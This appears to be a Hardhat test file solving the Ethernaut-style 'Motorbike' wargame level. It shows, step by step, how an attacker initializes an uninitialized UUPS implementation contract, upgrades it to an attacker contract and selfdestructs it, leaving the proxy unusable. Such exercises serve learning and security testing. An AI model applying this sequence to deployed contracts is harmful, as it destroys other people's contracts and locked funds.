import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"
import { Engine__factory, MotorbikeAttacker__factory, Motorbike__factory } from "../typechain"

const CONTRACT_PROXY = "Motorbike"
const CONTRACT_IMPLEMENTATION = "Engine"
const CONTRACT_ATTACKER = "MotorbikeAttacker"

describe(CONTRACT_PROXY, () => {
    let owner, attacker: SignerWithAddress
    let motobike, engine, attackerContract: Contract
    let tx: TransactionResponse

    it("Should be possible to selfdestruct the engine and make the motorbike unusable", async () => {
        [ owner, attacker ] = await ethers.getSigners()

        engine = await new Engine__factory(owner).deploy()
        
        let code = await ethers.provider.getCode(engine.address)
        expect(code).to.not.eq("0x")

        const iface = new ethers.utils.Interface(["function initialize()"])
        const init_enc = iface.encodeFunctionData("initialize", [])

        motobike = await new Motorbike__factory(owner).deploy(engine.address)

        tx = await engine.connect(attacker).initialize()
        await tx.wait()

        attackerContract = await new MotorbikeAttacker__factory(attacker).deploy()

        tx = await engine.connect(attacker)
            .upgradeToAndCall(attackerContract.address, init_enc)
        await tx.wait()

        code = await ethers.provider.getCode(engine.address)
        expect(code).to.be.eq("0x")
    })
})